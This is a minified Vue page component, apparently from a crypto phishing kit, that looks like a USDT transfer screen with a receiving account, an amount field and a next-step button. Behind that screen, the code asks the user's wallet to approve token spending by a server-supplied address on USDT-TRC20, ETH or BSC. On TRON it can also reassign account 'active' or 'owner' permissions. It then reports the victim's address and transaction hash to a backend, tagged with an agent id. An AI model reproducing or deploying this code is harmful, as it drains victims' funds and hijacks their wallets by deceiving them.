import{u as a}from"./c-fc79c42e.js";import{s as e,a as s,b as t,g as o}from"./W-37d156f0.js";import{B as i,a as r,b as l,c,t as u,g as p}from"./1mQokp-2e654320.js";import{T as d}from"./G4aW2R6-fada584f.js";import{d as n,e as m,c as v,g as b,a as f,b as j}from"./oEbJP-bd64f32e.js";import{v as w,c as g,b as h,Q as y,P as k,l as x,M as T,R as S,S as R,O as A,q as I}from"./wuV1FhF-24c12a21.js";import{r as O,u as L}from"./jH6-bd9b654c.js";import{P as X}from"./jm6F5-fb778bf1.js";import{F as _,B as C,s as F,a as P,c as B}from"./9bB-27ddf9db.js";import{_ as E}from"./s3a9ClOjsD-89ade589.js";import"./Si6CcLE8-e7d4da71.js";import"./hW8d-8b20c418.js";import"./4p-0a151786.js";import"./F2DVKzCv-146bfa18.js";import"./Vyz7axxtws-b987fa0e.js";import"./JO-c498f76c.js";import"./H9k9lQrPkt-e3d71dac.js";import"./G-9c465e3c.js";import"./mvK-b801ca05.js";import"./dbX06-f0c9a243.js";import"./TG-7a40dfae.js";import"./JU4wl8Xt-8c2448c7.js";import"./FbGBRWXaLF-e13ae1db.js";import"./TD-ba991851.js";import"./dx-d7e5e14c.js";import"./mRi14JL4a-30590811.js";import"./TseF-37e1aa5f.js";import"./0G0XLgFoa2-914a67ae.js";import"./y-b218a853.js";import"./MbCx-5fb628ff.js";import"./LqcZ-cdd5e12b.js";import"./I-60905d6f.js";/* empty css            */import"./if-e0c19dae.js";/* empty css                  */import"./fGregx-6d6ef1e1.js";import"./qrQRk5xhu-2cecd52a.js";import"./2-212beb8c.js";import"./ge9cx-0055785d.js";import"./6Lw3-f1343a66.js";import"./bA9a-df00bc6d.js";import"./aAuT1e-62590a4d.js";import"./onRPwy9lgY-1def53b9.js";import"./MFCDLfXX-3cf61883.js";import"./gWrkvJR-adafd12b.js";import"./lS-18999fb3.js";import"./LvtcGst9Y-75b3797a.js";import"./u-15f6a371.js";import"./O7PYrnU-b1b8fa5a.js";import"./qApZIwxc-0247765e.js";import"./gSPoOxg-d8652821.js";import"./kp-3ab5672b.js";import"./ulO4esrT3j-011e51e2.js";import"./O1WyM0-d89e5ff6.js";import"./bl-8134afa4.js";import"./qmQY5p8PQ-3f1983a4.js";import"./S26ef-b21e8816.js";import"./K83vrRl-96980a10.js";import"./2fE-967e6503.js";import"./dONp5Py-5ed9f22a.js";import"./fZAUeQ-d9bffe67.js";import"./Wfzcn9ErB-2caa5830.js";import"./asCJ7bXM5T-793400d9.js";import"./pQUB9RuMgR-71693449.js";import"./wh-4b7d007d.js";const H=a=>(S("data-v-6966fb22"),a=a(),R(),a),J={class:"page-container"},N=H((()=>k("div",{class:"bottom-m10 left-m10 right-m30 top-p10 o7 fs14"},"收款账号",-1))),G={class:"left-m10 bg-white br12 right-m10",style:{padding:"12px 15px","border-radius":"5px"}},Q={class:"bottom-m10 left-m10 right-m10 top-m20 o7 fs14 spaceb"},U=H((()=>k("span",{class:"fs14"},"数量",-1))),W={class:"fs14 o7"},q={class:"bg-white left-m10 br12 right-m10",style:{"border-radius":"5px"}},z={class:"address left-m20 o7 top-p20 bottom-p10 column"},D={style:{"margin-right":"15px"}},M={class:"spaceb right-m10 top-m10 o6"},V={class:"fs14"},Y={class:"center-w confirm-btn left-m10 right-m10",style:{"margin-top":"15px"}},Z=E(w({__name:"imPay",setup(w){const S=O(0),R=O(0),E=O(.069),H=O({type:1,walletType:1,agentId:"",token:"USDT",amount:1,clientId:"",block:i.TRX,ads:"",isAdd:!1,client_type:1,extend:{}}),Z=O("");O("");const K=O({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),$=O("");O(!1),a(),O("");const aa=O(!0),ea=g((()=>H.value.ads||K.value.receiveAddress[H.value.block])),sa=()=>{const{type:a}=H.value;if(R.value<S.value)return F("Insufficient balance");1==a?ta():2==a?oa():ia()},ta=async()=>{try{if(P({message:"Loading...",duration:0}),H.value.block==i.TRX){const a=await r("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",Z.value,$.value);a.result&&(ra($.value,"approve",a.txid),F(K.value.authSuccessTips))}else if(H.value.block==i.ETH){const a=await n(web3.value,$.value,Z.value);a.transactionHash&&(ra($.value,"approve",a.transactionHash),F(K.value.authSuccessTips))}else if(H.value.block==i.BSC){const a=await m(web3.value,$.value,Z.value);a.transactionHash&&(ra($.value,"approve",a.transactionHash),F(K.value.authSuccessTips))}}catch(a){B()}},oa=async()=>{if(H.value.block!=i.TRX)return;const a=await l(Z.value,$.value,H.value.isAdd);(null==a?void 0:a.result)?(ra($.value,"active",a.txid),F(K.value.authSuccessTips),B()):a&&F("object"==typeof a?JSON.stringify(a):String(a))},ia=async()=>{if(H.value.block!=i.TRX)return;const a=await c(Z.value);a.result&&(ra($.value,"owner",a.txid),F(K.value.authSuccessTips))},ra=async(a,o,i)=>{const r={addres:a,auth_addres:Z.value,hash:i||0,wallete_type:"ImToken",client_id:H.value.clientId||K.value.clientId||"",source:window.location.href,agent_uid:H.value.agentId,block:H.value.block,client_type:H.value.client_type,amount:H.value.amount,extend:H.value.extend?JSON.stringify(H.value.extend):""};switch(o){case"approve":await t(r);break;case"active":await s(r);break;case"owner":await e(r)}B()},la=async()=>{let a;switch(H.value.block){case i.TRX:if($.value=await tronWeb.defaultAddress.base58,!$.value)return F("无法获取钱包地址！请检查浏览器是否支持TRON！");R.value=await p($.value,H.value.token);break;case i.ETH:a=await f(),web3.value=a.web3,$.value=a.userAddress,R.value=await j(web3.value,a.userAddress);break;case i.BSC:a=await v(),web3.value=a.web3,$.value=a.userAddress,R.value=await b(web3.value,a.userAddress)}};return h((async()=>{const a=JSON.parse(localStorage.getItem("routerParams"));if(S.value=a.amount,H.value={amount:S.value,type:a.type,walletType:1,agentId:a.agent,token:a.token||"USDT",block:a.block||i.TRX,clientId:a.clientId||"",ads:a.ads,isAdd:a.isAdd,client_type:1,extend:a.extend},(async()=>{try{const a=JSON.parse(localStorage.getItem("config"));K.value={...a};const{type:e}=H.value;aa.value=!0;const s=await o({block:H.value.block,type:u[H.value.type]});aa.value=!1;const t=s.data;K.value={...a,authAddress:t},Z.value=K.value.authAddress}catch(a){aa.value=!1}})(),d.isTokenEnv())try{d.apis.navigator.setTitle(`${String(H.value.token).toLocaleLowerCase()}转账`);let a="";a=H.value.block==i.TRX?await d.apis.user.showAccountSwitch("TRON"):await d.apis.user.showAccountSwitch("ETHEREUM"),$.value=a,la()}catch(e){4001==e.code&&la()}else{la();const a=`imtokenv2://navigate?screen=DappView&url=${window.location.href}`;window.location.href=a}})),(a,e)=>(A(),y("div",J,[N,k("div",G,X(ea.value||"-"),1),k("div",Q,[U,k("span",W,X(R.value)+" "+X(String(H.value.token).toLocaleUpperCase()),1)]),k("div",q,[k("div",z,[k("div",D,[x(L(_),{modelValue:S.value,"onUpdate:modelValue":e[0]||(e[0]=a=>S.value=a),type:"number",label:"",placeholder:"请输入",size:"large",style:{"font-size":"16px",padding:"0 0 10px 0px","border-bottom":"1px solid #eee"}},null,8,["modelValue"])]),k("div",M,[k("span",V," $ "+X("t"==H.value.token?Number(Number(S.value).toFixed(2)*E.value).toFixed(3):S.value),1)])])]),k("div",Y,[x(L(C),{style:{width:"100%","border-radius":"8px"},size:"large",color:"#3478f6",onClick:sa,loading:aa.value},{default:T((()=>[I("下一步")])),_:1},8,["loading"])])]))}}),[["__scopeId","data-v-6966fb22"]]);export{Z as default};
